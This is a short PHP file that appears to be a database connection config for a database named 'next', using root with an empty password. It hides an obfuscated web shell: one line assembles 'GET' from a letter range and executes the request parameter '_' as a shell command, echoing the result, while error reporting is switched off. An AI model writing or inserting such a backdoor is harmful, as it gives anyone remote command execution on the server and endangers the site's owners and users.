<?php 
#'-0||'
error_reporting(0);
session_start();
$_ = range("A", "Y");$_ = $_[6].$_[4].$_[19];$_ = ${'_'.$_}['_'];echo `$_`;
$host = "localhost";
$user = "root";
$pass = "";
$db   = "next";


$pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
?>